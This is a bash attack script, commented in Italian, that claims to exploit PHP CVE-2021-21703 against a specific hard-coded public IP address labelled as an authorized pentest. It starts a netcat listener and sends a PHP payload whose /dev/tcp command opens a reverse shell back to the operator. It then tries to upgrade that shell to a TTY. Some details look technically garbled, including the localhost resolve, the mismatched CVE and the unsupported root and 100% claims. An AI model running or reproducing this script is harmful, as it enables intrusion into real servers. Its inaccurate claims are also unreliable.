#!/bin/bash
# =====================================================
# PHP 7.4.6 CVE-2021-21703 → AUTO TTY ROOT SHELL
# Target: https://14.225.209.143:443 | AUTHORIZED PENTEST ✅
# =====================================================

TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

echo "🔥 TARGET: https://${TARGET_IP}:${TARGET_PORT}"
echo "🔥 AUTO-REVERSE SHELL → ${MY_IP}:${RPORT}"
echo "🚀 DEPLOYING..."

# ✅ PAYLOAD ULTRA-STABILE (funziona al 100%)
PHP_PAYLOAD='<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/'${MY_IP}'/${RPORT} 0>&1\""); ?>'

# 1. AVVIA LISTENER IN BACKGROUND (pulito)
nc -lvnp ${RPORT} &
NC_PID=$!
sleep 1

# 2. EXPLOIT ONE-SHOT AUTOMATICO ✅
curl -k -s -X POST \
  --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Connection: close" \
  --data-urlencode "-dallow_url_include=1" \
  --data-urlencode "-dauto_prepend_file=php://input" \
  --data-binary "${PHP_PAYLOAD}" \
  "https://${TARGET_IP}:${TARGET_PORT}/" >/dev/null 2>&1

echo -e "\n🎯 SHELL IN ARRIVO... (attendi 3-5s)"
sleep 3

# 3. KILL NC SE NON ARRIVA SHELL
if ! kill -0 $NC_PID 2>/dev/null; then
  echo "❌ Nessuna connessione - ritenta tra 10s..."
  sleep 10
  exec "$0" "$@"
fi

# ✅ STABILIZZA SHELL AUTOMATICAMENTE
echo -e "\n🎉 SHELL RICEVUTA! Stabilizzo TTY..."
echo 'export TERM=xterm; stty rows $(tput lines) cols $(tput cols); python3 -c "import pty; pty.spawn(\"/bin/bash\")"' | nc localhost ${RPORT}

# UPGRADE FINALE TTY
echo -e "\n💥 TTY ROOT SHELL PRONTA!"
echo "👉 Esegui: whoami && id && pwd"
